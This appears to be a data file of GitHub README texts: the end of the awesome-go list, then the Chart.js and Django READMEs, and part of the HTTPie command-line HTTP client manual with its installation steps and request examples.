Vim.\nvscode-go - Extension for Visual Studio Code (VS Code) which provides support for the Go language.\nWatch - Runs a command in an acme win on file changes.\n\nGo Generate Tools\n\ngeneric - flexible data type for Go.\ngenny - Elegant generics for Go.\ngocontracts - brings design-by-contract to Go by synchronizing the code with the documentation.\ngonerics - Idiomatic Generics in Go.\ngotests - Generate Go tests from your source code.\ngounit - Generate Go tests using your own templates.\nre2dfa - Transform regular expressions into finite state machines and output Go source code.\nTOML-to-Go - Translates TOML into a Go type in the browser instantly.\n\nGo Tools\n\ncolorgo - Wrapper around go command for colorized go build output.\ndepth - Visualize dependency trees of any package by analyzing imports.\ngb - An easy to use project based build tool for the Go programming language.\ngenerator-go-lang - A Yeoman generator to get new Go projects started.\ngo-callvis - Visualize call graph of your Go program using dot format.\ngo-pkg-complete - Bash completion for go and wgo.\ngo-swagger - Swagger 2.0 implementation for go. Swagger is a simple yet powerful representation of your RESTful API.\ngodbg - Implementation of Rusts dbg! macro for quick and easy debugging during development.\nOctoLinker - Navigate through go files efficiently with the OctoLinker browser extension for GitHub.\nrichgo - Enrich go test outputs with text decorations.\nrts - RTS: response to struct. Generates Go structs from server responses.\n\nSoftware Packages\nSoftware written in Go.\nDevOps Tools\n\naptly - aptly is a Debian repository management tool.\naurora - Cross-platform web-based Beanstalkd queue server console.\nawsenv - Small binary that loads Amazon (AWS) environment variables for a profile.\nBanshee - Anomalies detection system for periodic metrics.\nBlast - A simple tool for API load testing and batch jobs.\nbombardier - Fast cross-platform HTTP benchmarking tool.\nbosun - Time Series Alerting Framework.\nDepCharge - Helps orchestrating the execution of commands across the many dependencies in larger projects.\ndogo - Monitoring changes in the source file and automatically compile and run (restart).\ndrone-jenkins - Trigger downstream Jenkins jobs using a binary, docker or Drone CI.\ndrone-scp - Copy files and artifacts via SSH using a binary, docker or Drone CI.\nDropship - Tool for deploying code via cdn.\neasyssh-proxy - Golang package for easy remote execution through SSH and SCP downloading via ProxyCommand.\nfac - Command-line user interface to fix git merge conflicts.\ngaia - Build powerful pipelines in any programming language.\nGitea - Fork of Gogs, entirely community driven.\ngitea-github-migrator - Migrate all your GitHub repositories, issues, milestones and labels to your Gitea instance.\ngo-furnace - Hosting solution written in Go. Deploy your Application with ease on AWS, GCP or DigitalOcean.\ngo-selfupdate - Enable your Go applications to self update.\ngobrew - gobrew lets you easily switch between multiple versions of go.\ngodbg - Web-based gdb front-end application.\nGogs - A Self Hosted Git Service in the Go Programming Language.\ngonative - Tool which creates a build of Go that can cross compile to all platforms while still using the Cgo-enabled versions of the stdlib packages.\ngovvv - \u201cgo build\u201d wrapper to easily add version information into Go binaries.\ngox - Dead simple, no frills Go cross compile tool.\ngoxc - build tool for Go, with a focus on cross-compiling and packaging.\ngrapes - Lightweight tool designed to distribute commands over ssh with ease.\nGVM - GVM provides an interface to manage Go versions.\nHey - Hey is a tiny program that sends some load to a web application.\nkala - Simplistic, modern, and performant job scheduler.\nkcli - Command line tool for inspecting kafka topics/partitions/messages.\nkubernetes - Container Cluster Manager from Google.\nlstags - Tool and API to sync Docker images across different registries.\nlwc - A live-updating version of the UNIX wc command.\nmanssh - manssh is a command line tool for managing your ssh alias config easily.\nMoby - Collaborative project for the container ecosystem to assemble container-based systems.\nMora - REST server for accessing MongoDB documents and meta data.\nostent - collects and displays system metrics and optionally relays to Graphite and/or InfluxDB.\nPacker - Packer is a tool for creating identical machine images for multiple platforms from a single source configuration.\nPewpew - Flexible HTTP command line stress tester.\nPomerium - Pomerium is an identity-aware access proxy.\nRodent - Rodent helps you manage Go versions, projects and track dependencies.\ns3gof3r - Small utility/library optimized for high speed transfer of large objects into and out of Amazon S3.\nScaleway-cli - Manage BareMetal Servers from Command Line (as easily as with Docker).\nsg - Benchmarks a set of HTTP endpoints (like ab), with possibility to use the response code and data between each call for specific server stress based on its previous response.\nskm - SKM is a simple and powerful SSH Keys Manager, it helps you to manage your multiple SSH keys easily!\nStatusOK - Monitor your Website and REST APIs.Get Notified through Slack, E-mail when your server is down or response time is more than expected.\ntraefik - Reverse proxy and load balancer with support for multiple backends.\nVegeta - HTTP load testing tool and library. It's over 9000!\nwebhook - Tool which allows user to create HTTP endpoints (hooks) that execute commands on the server.\nWide - Web-based IDE for Teams using Golang.\nwinrm-cli - Cli tool to remotely execute commands on Windows machines.\n\nOther Software\n\nborg - Terminal based search engine for bash snippets.\nboxed - Dropbox based blog engine.\nCherry - Tiny webchat server in Go.\nCircuit - Circuit is a programmable platform-as-a-service (PaaS) and/or Infrastructure-as-a-Service (IaaS), for management, discovery, synchronization and orchestration of services and hosts comprising cloud applications.\nComcast - Simulate bad network connections.\nconfd - Manage local application configuration files using templates and data from etcd or consul.\nDDNS - Personal DDNS client with Digital Ocean Networking DNS as backend.\nDocker - Open platform for distributed applications for developers and sysadmins.\nDocumize - Modern wiki software that integrates data from SaaS tools.\ndrive - Google Drive client for the commandline.\nDuplicacy - A cross-platform network and cloud backup tool based on the idea of lock-free deduplication.\ngfile - Securely transfer files between two computers, without any third party, over WebRTC.\nGo Package Store - App that displays updates for the Go packages in your GOPATH.\ngo-peerflix - Video streaming torrent client.\nGoBoy - Nintendo Game Boy Color emulator written in Go.\ngocc - Gocc is a compiler kit for Go written in Go.\nGoDNS - A dynamic DNS client tool, supports DNSPod & HE.net, written in Go.\nGoDocTooltip - Chrome extension for Go Doc sites, which shows function description as tooltip at function list.\nGoLand - Full featured cross-platform Go IDE.\nGor - Http traffic replication tool, for replaying traffic from production to stage/dev environments in real-time.\nhugo - Fast and Modern Static Website Engine.\nide - Browser accessible IDE. Designed for Go with Go.\nipe - Open source Pusher server implementation compatible with Pusher client libraries written in GO.\njoincap - Command-line utility for merging multiple pcap files together.\nJuju - Cloud-agnostic service deployment and orchestration - supports EC2, Azure, Openstack, MAAS and more.\nLeaps - Pair programming service using Operational Transforms.\nlgo - Interactive Go programming with Jupyter. It supports code completion, code inspection and 100% Go compatibility.\nlimetext - Lime Text is a powerful and elegant text editor primarily developed in Go that aims to be a Free and open-source software successor to Sublime Text.\nLiteIDE - LiteIDE is a simple, open source, cross-platform Go IDE.\nmockingjay - Fake HTTP servers and consumer driven contracts from one configuration file. You can also make the server randomly misbehave to help do more realistic performance tests.\nmyLG - Command Line Network Diagnostic tool written in Go.\nnaclpipe - Simple NaCL EC25519 based crypto pipe tool written in Go.\nnes - Nintendo Entertainment System (NES) emulator written in Go.\norange-cat - Markdown previewer written in Go.\nOrbit - A simple tool for running commands and generating files from templates.\npeg - Peg, Parsing Expression Grammar, is an implementation of a Packrat parser generator.\nPipe - A small and beautiful blogging platform.\nrestic - De-duplicating backup program.\nrkt - App Container runtime that integrates with init systems, is compatible with other container formats like Docker, and supports alternative execution engines like KVM.\nscc - Sloc Cloc and Code, a very fast accurate code counter with complexity calculations and COCOMO estimates.\nSeaweed File System - Fast, Simple and Scalable Distributed File System with O(1) disk seek.\nshell2http - Executing shell commands via http server (for prototyping or remote control).\nsnap - Powerful telemetry framework.\nSnitch - Simple way to notify your team and many tools when someone has deployed any application via Tsuru.\nStack Up - Stack Up, a super simple deployment tool - just Unix - think of it like 'make' for a network of servers.\nsyncthing - Open, decentralized file synchronization tool and protocol.\nterm-quiz - Quizzes for your terminal.\ntoxiproxy - Proxy to simulate network and system conditions for automated tests.\ntsuru - Extensible and open source Platform as a Service software.\nvFlow - High-performance, scalable and reliable IPFIX, sFlow and Netflow collector.\nwellington - Sass project management tool, extends the language with sprite functions (like Compass).\n\nResources\nWhere to discover new Go libraries.\nBenchmarks\n\nautobench - Framework to compare the performance between different Go versions.\ngo-benchmark-app - Powerful HTTP-benchmark tool mixed with \u0410b, Wrk, Siege tools. Gathering statistics and various parameters for benchmarks and comparison results.\ngo-benchmarks - Few miscellaneous Go microbenchmarks. Compare some language features to alternative approaches.\ngo-http-routing-benchmark - Go HTTP request router benchmark and comparison.\ngo-web-framework-benchmark - Go web framework benchmark.\ngo_serialization_benchmarks - Benchmarks of Go serialization methods.\ngocostmodel - Benchmarks of common basic operations for the Go language.\ngolang-micro-benchmarks - Tiny collection of Go micro benchmarks. The intent is to compare some language features to others.\ngolang-sql-benchmark - Collection of benchmarks for popular Go database/SQL utilities.\ngospeed - Go micro-benchmarks for calculating the speed of language constructs.\nkvbench - Key/Value database benchmark.\nskynet - Skynet 1M threads microbenchmark.\nspeedtest-resize - Compare various Image resize algorithms for the Go language.\n\nConferences\n\nCapital Go - Washington, D.C., USA.\ndotGo - Paris, France.\nGoCon - Tokyo, Japan.\nGoDays - Berlin, Germany.\nGoLab - Florence, Italy.\nGolangUK - London, UK.\nGopherChina - Shanghai, China.\nGopherCon - Denver, USA.\nGopherCon Brazil - Florian\u00f3polis, BR.\nGopherCon Europe - Reykjavik, Iceland.\nGopherCon India - Pune, India.\nGopherCon Israel - Tel Aviv, Israel.\nGopherCon Russia - Moscow, Russia.\nGopherCon Singapore - Mapletree Business City, Singapore.\nGopherCon Vietnam - Ho Chi Minh City, Vietnam.\nGothamGo - New York City, USA.\nGoWayFest - Minsk, Belarus.\n\nE-Books\n\nA Go Developer's Notebook\nAn Introduction to Programming in Go\nBuild Web Application with Golang\nBuilding Web Apps With Go\nGo 101 - A book focusing on Go syntax/semantics and all kinds of details.\nGo Bootcamp\nGo Succinctly - in Persian.\nGoBooks - A curated list of Go books.\nLearning Go\nNetwork Programming With Go\nThe Go Programming Language\nWeb Application with Go the Anti-Textbook\nWriting A Compiler In Go\nWriting An Interpreter In Go\n\nGophers\n\nFree Gophers Pack - Gopher graphics pack by Maria Letta with illustrations and emotional characters in vector and raster.\nGo-gopher-Vector - Go gopher Vector Data [.ai, .svg].\ngopher-logos - adorable gopher logos.\ngopher-stickers\ngopher-vector\ngophericons\ngopherize.me - Gopherize yourself.\ngophers - Gopher artworks by Ashley McNamara.\ngophers - Free gophers.\ngophers - random gopher graphics.\ngophers - Gopher amigurumi toy pattern.\n\nMeetups\n\nBrisbane Gophers\nGo Language NYC\nGo London User Group\nGo Toronto\nGo User Group Atlanta\nGoBridge, San Francisco, CA\nGoJakarta\nGolang Amsterdam\nGolang Argentina\nGolang Baltimore, MD\nGolang Bangalore\nGolang Belo Horizonte - Brazil\nGolang Boston\nGolang Bulgaria\nGolang Cardiff, UK\nGolang Copenhagen\nGolang DC, Arlington, VA\nGolang Dorset, UK\nGolang Hamburg - Germany\nGolang Israel\nGolang Joinville - Brazil\nGolang Lima - Peru\nGolang Lyon\nGolang Marseille\nGolang Melbourne\nGolang Mountain View\nGolang New York\nGolang Paris\nGolang Pune\nGolang Singapore\nGolang Stockholm\nGolang Sydney, AU\nGolang S\u00e3o Paulo - Brazil\nGolang Taipei\nGolang Vancouver, BC\nGolang \u041a\u0430\u0437\u0430\u043d\u044c\nGolang \u041c\u043e\u0441\u043a\u0432\u0430\nGolang \u041f\u0438\u0442\u0435\u0440\nIstanbul Golang\nSeattle Go Programmers\nUkrainian Golang User Groups\nUtah Go User Group\nWomen Who Go - San Francisco, CA\n\nAdd the group of your city/country here (send PR)\nTwitter\n\n@golang\n@golang_news\n@golangch\n@golangflow\n@golangweekly\n\nWebsites\n\nAwesome Go @LibHunt - Your go-to Go Toolbox.\nAwesome Remote Job - Curated list of awesome remote jobs. A lot of them are looking for Go hackers.\nawesome-awesomeness - List of other amazingly awesome lists.\nCodinGame - Learn Go by solving interactive tasks using small games as practical examples.\nGo Blog - The official Go blog.\nGo Challenge - Learn Go by solving problems and getting feedback from Go experts.\nGo Community on Hashnode - Community of Gophers on Hashnode.\nGo Forum - Forum to discuss Go.\nGo In 5 Minutes - 5 minute screencasts focused on getting one thing done.\nGo Projects - List of projects on the Go community wiki.\nGo Report Card - A report card for your Go package.\ngocryforhelp - Collection of Go projects that needs help. Good place to start your open-source way in Go.\ngodoc.org - Documentation for open source Go packages.\nGolang Flow - Post Updates, News, Packages and more.\nGolang News - Links and news about Go programming.\ngolang-graphics - Collection of Go images, graphics, and art.\ngolang-nuts - Go mailing list.\nGoogle Plus Community - The Google+ community for #golang enthusiasts.\nGopher Community Chat - Join Our New Slack Community For Gophers (Understand how it came).\nGophercises - Free coding exercises for budding gophers.\ngowalker.org - Go Project API documentation.\njustforfunc - Youtube channel dedicated to Go programming language tips and tricks, hosted by  Francesc Campoy @francesc.\nr/Golang - News about Go.\nTrending Go repositories on GitHub today - Good place to find new Go libraries.\nTutorialEdge - Golang\n\nTutorials\n\n50 Shades of Go - Traps, Gotchas, and Common Mistakes for New Golang Devs.\nA Guide to Golang E-Commerce - Building a Golang site for e-commerce (demo included).\nA Tour of Go - Interactive tour of Go.\nBuild web application with Golang - Golang ebook intro how to build a web app with golang.\nBuilding Go Web Applications and Microservices Using Gin - Get familiar with Gin and find out how it can help you reduce boilerplate code and build a request handling pipeline.\nCaching Slow Database Queries - How to cache slow database queries.\nCanceling MySQL - How to cancel MySQL queries.\nEthereum Development with Go - A little e-book on Ethereum Development with Go.\nGames With Go - A video series teaching programming and game development.\nGo By Example - Hands-on introduction to Go using annotated example programs.\nGo Cheat Sheet - Go's reference card.\nGo database/sql tutorial - Introduction to database/sql.\nGo Playground for iOS - Interactively edit & play Go snippets on your mobile device.\nGo WebAssembly Tutorial - Building a Simple Calculator\nGolang for Node.js Developers - Examples of Golang compared to Node.js for learning.\nGolangbot - Tutorials to get started with programming in Go.\nHackr.io - Learn Go from the best online golang tutorials submitted & voted by the golang programming community.\nHow to Use Godog for Behavior-driven Development in Go - Get started with Godog \u2014 a Behavior-driven development framework for building and testing Go applications.\nLearn Go with TDD - Learn Go with test-driven development.\npackage main - YouTube channel about Programming in Go.\nThe world\u2019s easiest introduction to WebAssembly with Golang\nWorking with Go - Intro to go for experienced programmers.\nYour basic Go - Huge collection of tutorials and how to's."}, {"title": "chartjs/Chart.js", "language": "JavaScript", "content": "Simple yet flexible JavaScript charting for designers & developers\n\n\n\n\n\n\n\n\nDocumentation\n\nIntroduction\nGetting Started\nGeneral\nConfiguration\nCharts\nAxes\nDevelopers\nPopular Extensions\nSamples\n\nContributing\nInstructions on building and testing Chart.js can be found in the documentation. Before submitting an issue or a pull request, please take a moment to look over the contributing guidelines first. For support, please post questions on Stack Overflow with the chartjs tag.\nLicense\nChart.js is available under the MIT license."}, {"title": "django/django", "language": "Python", "content": "Django is a high-level Python Web framework that encourages rapid development\nand clean, pragmatic design. Thanks for checking it out.\nAll documentation is in the \"docs\" directory and online at\nhttps://docs.djangoproject.com/en/stable/. If you're just getting started,\nhere's how we recommend you read the docs:\n\nFirst, read docs/intro/install.txt for instructions on installing Django.\nNext, work through the tutorials in order (docs/intro/tutorial01.txt,\ndocs/intro/tutorial02.txt, etc.).\nIf you want to set up an actual deployment server, read\ndocs/howto/deployment/index.txt for instructions.\nYou'll probably want to read through the topical guides (in docs/topics)\nnext; from there you can jump to the HOWTOs (in docs/howto) for specific\nproblems, and check out the reference (docs/ref) for gory details.\nSee docs/README for instructions on building an HTML version of the docs.\n\nDocs are updated rigorously. If you find any problems in the docs, or think\nthey should be clarified in any way, please take 30 seconds to fill out a\nticket here: https://code.djangoproject.com/newticket\nTo get more help:\n\nJoin the #django channel on irc.freenode.net. Lots of helpful people hang\nout there. See https://en.wikipedia.org/wiki/Wikipedia:IRC/Tutorial if you're\nnew to IRC.\nJoin the django-users mailing list, or read the archives, at\nhttps://groups.google.com/group/django-users.\n\nTo contribute to Django:\n\nCheck out https://docs.djangoproject.com/en/dev/internals/contributing/ for\ninformation about getting involved.\n\nTo run Django's test suite:\n\nFollow the instructions in the \"Unit tests\" section of\ndocs/internals/contributing/writing-code/unit-tests.txt, published online at\nhttps://docs.djangoproject.com/en/dev/internals/contributing/writing-code/unit-tests/#running-the-unit-tests"}, {"title": "jakubroztocil/httpie", "language": "Python", "content": "HTTPie: a CLI, cURL-like tool for humans\nHTTPie (pronounced aitch-tee-tee-pie) is a command line HTTP client.\nIts goal is to make CLI interaction with web services as human-friendly\nas possible. It provides a simple http command that allows for sending\narbitrary HTTP requests using a simple and natural syntax, and displays\ncolorized output. HTTPie can be used for testing, debugging, and\ngenerally interacting with HTTP servers.\n\n\n   \n\nContents\n\n1\u00a0\u00a0\u00a0Main features\n2\u00a0\u00a0\u00a0Installation\n2.1\u00a0\u00a0\u00a0macOS\n2.2\u00a0\u00a0\u00a0Linux\n2.3\u00a0\u00a0\u00a0Windows, etc.\n2.4\u00a0\u00a0\u00a0Python version\n2.5\u00a0\u00a0\u00a0Unstable version\n\n\n3\u00a0\u00a0\u00a0Usage\n3.1\u00a0\u00a0\u00a0Examples\n\n\n4\u00a0\u00a0\u00a0HTTP method\n5\u00a0\u00a0\u00a0Request URL\n5.1\u00a0\u00a0\u00a0Querystring parameters\n5.2\u00a0\u00a0\u00a0URL shortcuts for localhost\n5.3\u00a0\u00a0\u00a0Custom default scheme\n\n\n6\u00a0\u00a0\u00a0Request items\n6.1\u00a0\u00a0\u00a0Escaping rules\n\n\n7\u00a0\u00a0\u00a0JSON\n7.1\u00a0\u00a0\u00a0Default behaviour\n7.2\u00a0\u00a0\u00a0Explicit JSON\n7.3\u00a0\u00a0\u00a0Non-string JSON fields\n\n\n8\u00a0\u00a0\u00a0Forms\n8.1\u00a0\u00a0\u00a0Regular forms\n8.2\u00a0\u00a0\u00a0File upload forms\n\n\n9\u00a0\u00a0\u00a0HTTP headers\n9.1\u00a0\u00a0\u00a0Default request headers\n9.2\u00a0\u00a0\u00a0Empty headers and header un-setting\n\n\n10\u00a0\u00a0\u00a0Cookies\n11\u00a0\u00a0\u00a0Authentication\n11.1\u00a0\u00a0\u00a0Basic auth\n11.2\u00a0\u00a0\u00a0Digest auth\n11.3\u00a0\u00a0\u00a0Password prompt\n11.4\u00a0\u00a0\u00a0.netrc\n11.5\u00a0\u00a0\u00a0Auth plugins\n\n\n12\u00a0\u00a0\u00a0HTTP redirects\n12.1\u00a0\u00a0\u00a0Follow Location\n12.2\u00a0\u00a0\u00a0Showing intermediary redirect responses\n12.3\u00a0\u00a0\u00a0Limiting maximum redirects followed\n\n\n13\u00a0\u00a0\u00a0Proxies\n13.1\u00a0\u00a0\u00a0Environment variables\n13.2\u00a0\u00a0\u00a0SOCKS\n\n\n14\u00a0\u00a0\u00a0HTTPS\n14.1\u00a0\u00a0\u00a0Server SSL certificate verification\n14.2\u00a0\u00a0\u00a0Custom CA bundle\n14.3\u00a0\u00a0\u00a0Client side SSL certificate\n14.4\u00a0\u00a0\u00a0SSL version\n14.5\u00a0\u00a0\u00a0SNI (Server Name Indication)\n\n\n15\u00a0\u00a0\u00a0Output options\n15.1\u00a0\u00a0\u00a0What parts of the HTTP exchange should be printed\n15.2\u00a0\u00a0\u00a0Viewing intermediary requests/responses\n15.3\u00a0\u00a0\u00a0Conditional body download\n\n\n16\u00a0\u00a0\u00a0Redirected Input\n16.1\u00a0\u00a0\u00a0Request data from a filename\n\n\n17\u00a0\u00a0\u00a0Terminal output\n17.1\u00a0\u00a0\u00a0Colors and formatting\n17.2\u00a0\u00a0\u00a0Binary data\n\n\n18\u00a0\u00a0\u00a0Redirected output\n19\u00a0\u00a0\u00a0Download mode\n19.1\u00a0\u00a0\u00a0Downloaded file name\n19.2\u00a0\u00a0\u00a0Piping while downloading\n19.3\u00a0\u00a0\u00a0Resuming downloads\n19.4\u00a0\u00a0\u00a0Other notes\n\n\n20\u00a0\u00a0\u00a0Streamed responses\n20.1\u00a0\u00a0\u00a0Disabling buffering\n20.2\u00a0\u00a0\u00a0Examples use cases\n\n\n21\u00a0\u00a0\u00a0Sessions\n21.1\u00a0\u00a0\u00a0Named sessions\n21.2\u00a0\u00a0\u00a0Anonymous sessions\n21.3\u00a0\u00a0\u00a0Readonly session\n\n\n22\u00a0\u00a0\u00a0Config\n22.1\u00a0\u00a0\u00a0Config file location\n22.2\u00a0\u00a0\u00a0Configurable options\n22.2.1\u00a0\u00a0\u00a0default_options\n22.2.2\u00a0\u00a0\u00a0__meta__\n\n\n22.3\u00a0\u00a0\u00a0Un-setting previously specified options\n\n\n23\u00a0\u00a0\u00a0Scripting\n23.1\u00a0\u00a0\u00a0Best practices\n\n\n24\u00a0\u00a0\u00a0Meta\n24.1\u00a0\u00a0\u00a0Interface design\n24.2\u00a0\u00a0\u00a0User support\n24.3\u00a0\u00a0\u00a0Related projects\n24.3.1\u00a0\u00a0\u00a0Dependencies\n24.3.2\u00a0\u00a0\u00a0HTTPie friends\n24.3.3\u00a0\u00a0\u00a0Alternatives\n\n\n24.4\u00a0\u00a0\u00a0Contributing\n24.5\u00a0\u00a0\u00a0Change log\n24.6\u00a0\u00a0\u00a0Artwork\n24.7\u00a0\u00a0\u00a0Licence\n24.8\u00a0\u00a0\u00a0Authors\n\n\n\n\n\n1\u00a0\u00a0\u00a0Main features\n\nExpressive and intuitive syntax\nFormatted and colorized terminal output\nBuilt-in JSON support\nForms and file uploads\nHTTPS, proxies, and authentication\nArbitrary request data\nCustom headers\nPersistent sessions\nWget-like downloads\nPython 2.7 and 3.x support\nLinux, macOS and Windows support\nPlugins\nDocumentation\nTest coverage\n\n\n2\u00a0\u00a0\u00a0Installation\n\n2.1\u00a0\u00a0\u00a0macOS\nOn macOS, HTTPie can be installed via Homebrew\n(recommended):\n$ brew install httpie\nA MacPorts port is also available:\n$ port install httpie\n\n2.2\u00a0\u00a0\u00a0Linux\nMost Linux distributions provide a package that can be installed using the\nsystem package manager, for example:\n# Debian, Ubuntu, etc.\n$ apt-get install httpie\n# Fedora\n$ dnf install httpie\n# CentOS, RHEL, ...\n$ yum install httpie\n# Arch Linux\n$ pacman -S httpie\n\n2.3\u00a0\u00a0\u00a0Windows, etc.\nA universal installation method (that works on Windows, Mac OS X, Linux, \u2026,\nand always provides the latest version) is to use pip:\n# Make sure we have an up-to-date version of pip and setuptools:\n$ pip install --upgrade pip setuptools\n\n$ pip install --upgrade httpie\n(If pip installation fails for some reason, you can try\neasy_install httpie as a fallback.)\n\n2.4\u00a0\u00a0\u00a0Python version\nAlthough Python 2.7 is supported as well, it is strongly recommended to\ninstall HTTPie against the latest Python 3.x whenever possible. That will\nensure that some of the newer HTTP features, such as\nSNI (Server Name Indication), work out of the box.\nPython 3 is the default for Homebrew installations starting with version 0.9.4.\nTo see which version HTTPie uses, run http --debug.\n\n2.5\u00a0\u00a0\u00a0Unstable version\nYou can also install the latest unreleased development version directly from\nthe master branch on GitHub.  It is a work-in-progress of a future stable\nrelease so the experience might be not as smooth.\n\nOn macOS you can install it with Homebrew:\n$ brew install httpie --HEAD\nOtherwise with pip:\n$ pip install --upgrade https://github.com/jakubroztocil/httpie/archive/master.tar.gz\nVerify that now we have the\ncurrent development version identifier\nwith the -dev suffix, for example:\n$ http --version\n1.0.0-dev\n\n3\u00a0\u00a0\u00a0Usage\nHello World:\n$ http httpie.org\nSynopsis:\n$ http [flags] [METHOD] URL [ITEM [ITEM]]\nSee also http --help.\n\n3.1\u00a0\u00a0\u00a0Examples\nCustom HTTP method, HTTP headers and JSON data:\n$ http PUT example.org X-API-Token:123 name=John\nSubmitting forms:\n$ http -f POST example.org hello=World\nSee the request that is being sent using one of the output options:\n$ http -v example.org\nUse Github API to post a comment on an\nissue\nwith authentication:\n$ http -a USERNAME POST https://api.github.com/repos/jakubroztocil/httpie/issues/83/comments body='HTTPie is awesome! :heart:'\nUpload a file using redirected input:\n$ http example.org < file.json\nDownload a file and save it via redirected output:\n$ http example.org/file > file\nDownload a file wget style:\n$ http --download example.org/file\nUse named sessions to make certain aspects or the communication persistent\nbetween requests to the same host:\n$ http --session=logged-in -a username:password httpbin.org/get API-Key:123\n\n$ http --session=logged-in httpbin.org/headers\nSet a custom Host header to work around missing DNS records:\n$ http localhost:8000 Host:example.com\n\n4\u00a0\u00a0\u00a0HTTP method\nThe name of the HTTP method comes right before the URL argument:\n$ http DELETE example.org/todos/7\nWhich looks similar to the actual Request-Line that is sent:\nDELETE /todos/7 HTTP/1.1\nWhen the METHOD argument is omitted from the command, HTTPie defaults to\neither GET (with no request data) or POST (with request data).\n\n5\u00a0\u00a0\u00a0Request URL\nThe only information HTTPie needs to perform a request is a URL.\nThe default scheme is, somewhat unsurprisingly, http://,\nand can be omitted from the argument \u2013 http example.org works just fine.\n\n5.1\u00a0\u00a0\u00a0Querystring parameters\nIf you find yourself manually constructing URLs with querystring parameters\non the terminal, you may appreciate the param==value syntax for appending\nURL parameters. With that, you don't have to worry about escaping the &\nseparators for your shell. Also, special characters in parameter values,\nwill also automatically escaped (HTTPie otherwise expects the URL to be\nalready escaped). To search for HTTPie logo on Google Images you could use\nthis command:\n$ http www.google.com search=='HTTPie logo' tbm==isch\nGET /?search=HTTPie+logo&tbm=isch HTTP/1.1\n\n5.2\u00a0\u00a0\u00a0URL shortcuts for localhost\nAdditionally, curl-like shorthand for localhost is supported.\nThis means that, for example :3000 would expand to http://localhost:3000\nIf the port is omitted, then port 80 is assumed.\n$ http :/foo\nGET /foo HTTP/1.1\nHost: localhost\n$ http :3000/bar\nGET /bar HTTP/1.1\nHost: localhost:3000\n$ http :\nGET / HTTP/1.1\nHost: localhost\n\n5.3\u00a0\u00a0\u00a0Custom default scheme\nYou can use the --default-scheme <URL_SCHEME> option to create\nshortcuts for other protocols than HTTP:\n$ alias https='http --default-scheme=https'\n\n6\u00a0\u00a0\u00a0Request items\nThere are a few different request item types that provide a\nconvenient mechanism for specifying HTTP headers, simple JSON and\nform data, files, and URL parameters.\nThey are key/value pairs specified after the URL. All have in\ncommon that they become part of the actual request that is sent and that\ntheir type is distinguished only by the separator used:\n:, =, :=, ==, @, =@, and :=@. The ones with an\n@ expect a file path as value.\n\n\nItem Type\nDescription\n\n\n\nHTTP Headers\nName:Value\nArbitrary HTTP header, e.g. X-API-Token:123.\n\nURL parameters\nname==value\nAppends the given name/value pair as a query\nstring parameter to the URL.\nThe == separator is used.\n\nData Fields\nfield=value,\nfield=@file.txt\nRequest data fields to be serialized as a JSON\nobject (default), or to be form-encoded\n(--form, -f).\n\nRaw JSON fields\nfield:=json,\nfield:=@file.json\nUseful when sending JSON and one or\nmore fields need to be a Boolean, Number,\nnested Object, or an Array,  e.g.,\nmeals:='[\"ham\",\"spam\"]' or pies:=[1,2,3]\n(note the quotes).\n\nForm File Fields\nfield@/dir/file\nOnly available with --form, -f.\nFor example screenshot@~/Pictures/img.png.\nThe presence of a file field results\nin a multipart/form-data request.\n\n\n\nNote that data fields aren't the only way to specify request data:\nRedirected input is a mechanism for passing arbitrary request data.\n\n6.1\u00a0\u00a0\u00a0Escaping rules\nYou can use \\ to escape characters that shouldn't be used as separators\n(or parts thereof). For instance, foo\\==bar will become a data key/value\npair (foo= and bar) instead of a URL parameter.\nOften it is necessary to quote the values, e.g. foo='bar baz'.\nIf any of the field names or headers starts with a minus\n(e.g., -fieldname), you need to place all such items after the special\ntoken -- to prevent confusion with --arguments:\n$ http httpbin.org/post  --  -name-starting-with-dash=foo -Unusual-Header:bar\nPOST /post HTTP/1.1\n-Unusual-Header: bar\nContent-Type: application/json\n\n{\n    \"-name-starting-with-dash\": \"foo\"\n}\n\n7\u00a0\u00a0\u00a0JSON\nJSON is the lingua franca of modern web services and it is also the\nimplicit content type HTTPie uses by default.\nSimple example:\n$ http PUT example.org name=John email=john@example.org\nPUT / HTTP/1.1\nAccept: application/json, */*\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nHost: example.org\n\n{\n    \"name\": \"John\",\n    \"email\": \"john@example.org\"\n}\n\n7.1\u00a0\u00a0\u00a0Default behaviour\nIf your command includes some data request items, they are serialized as a JSON\nobject by default. HTTPie also automatically sets the following headers,\nboth of which can be overwritten:\n\n\nContent-Type\napplication/json\n\nAccept\napplication/json, */*\n\n\n\n\n7.2\u00a0\u00a0\u00a0Explicit JSON\nYou can use --json, -j to explicitly set Accept\nto application/json regardless of whether you are sending data\n(it's a shortcut for setting the header via the usual header notation:\nhttp url Accept:'application/json, */*'). Additionally,\nHTTPie will try to detect JSON responses even when the\nContent-Type is incorrectly text/plain or unknown.\n\n7.3\u00a0\u00a0\u00a0Non-string JSON fields\nNon-string fields use the := separator, which allows you to embed raw JSON\ninto the resulting object. Text and raw JSON files can also be embedded into\nfields using =@ and :=@:\n$ http PUT api.example.com/person/1 \\\n    name=John \\\n    age:=29 married:=false hobbies:='[\"http\", \"pies\"]' \\  # Raw JSON\n    description=@about-john.txt \\   # Embed text file\n    bookmarks:=@bookmarks.json      # Embed JSON file\nPUT /person/1 HTTP/1.1\nAccept: application/json, */*\nContent-Type: application/json\nHost: api.example.com\n\n{\n    \"age\": 29,\n    \"hobbies\": [\n        \"http\",\n        \"pies\"\n    ],\n    \"description\": \"John is a nice guy who likes pies.\",\n    \"married\": false,\n    \"name\": \"John\",\n    \"bookmarks\": {\n        \"HTTPie\": \"http://httpie.org\",\n    }\n}\nPlease note that with this syntax the command gets unwieldy when sending\ncomplex data. In that case it's always better to use redirected input:\n$ http POST api.example.com/person/1 < person.json\n\n8\u00a0\u00a0\u00a0Forms\nSubmitting forms is very similar to sending JSON requests. Often the only\ndifference is in adding the --form, -f option, which ensures that\ndata fields are serialized as, and Content-Type is set to,\napplication/x-www-form-urlencoded; charset=utf-8. It is possible to make\nform data the implicit content type instead of JSON\nvia the config file.\n\n8.1\u00a0\u00a0\u00a0Regular forms\n$ http --form POST api.example.org/person/1 name='John Smith'\nPOST /person/1 HTTP/1.1\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\n\nname=John+Smith\n\n8.2\u00a0\u00a0\u00a0File upload forms\nIf one or more file fields is present, the serialization and content type is\nmultipart/form-data:\n$ http -f POST example.com/jobs name='John Smith' cv@~/Documents/cv.pdf\nThe request above is the same as if the following HTML form were\nsubmitted:\n<form enctype=\"multipart/form-data\" method=\"post\" action=\"http://example.com/jobs\">\n    <input 